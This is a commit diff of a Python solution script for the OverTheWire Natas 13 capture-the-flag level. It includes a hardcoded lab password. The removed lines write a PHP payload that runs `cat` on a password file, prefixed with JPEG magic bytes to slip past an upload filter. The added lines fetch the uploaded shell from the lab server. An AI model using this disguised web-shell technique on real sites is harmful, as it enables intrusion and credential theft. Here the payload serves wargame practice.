e97809311ceb675b8fed7992c3dd29b2df55d6ef
Abdullah Taher Anwer Shaikh <abdullah.taher810@gmail.com>
2026-08-02 11:36:09 +0300

    Refactor Natas13.py for HTTP requests and session
    Updated Natas13.py to include HTTP request handling and session management.

--- Natas/Scripts/Natas13.py
+++ Natas/Scripts/Natas13.py
@@ -1,9 +1,17 @@
-php_command="<?php echo shell_exec('cat /etc/natas_webpass/natas14'); ?>"
+import requests
+import re #regular expressions
 
-jpeg_header=b'\xFF\xD8\xFF\xE0'
+username = "natas13"
+password = "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k"
 
-with open('natas13.php', 'wb') as f:
-    f.write(jpeg_header)
-    f.write(php_command.encode('utf-8'))
+url = 'http://%s.natas.labs.overthewire.org/upload/ltgloxi8q8.php' % username
+file = {"uploadedfile":open("Natas 13.php","rb")}
+data = {"filename":"Natas 13.php"}
 
-print("PHP file created successfully.")
+session = requests.Session() #Maintains a session
+#response = session.post(url , auth=(username, password),files=file,data=data)
+response = session.get(url, auth = (username,password))
+content = response.text
+
+print (content)
+#print (re.findall("natas12 is (.*)<br>",content)[0])
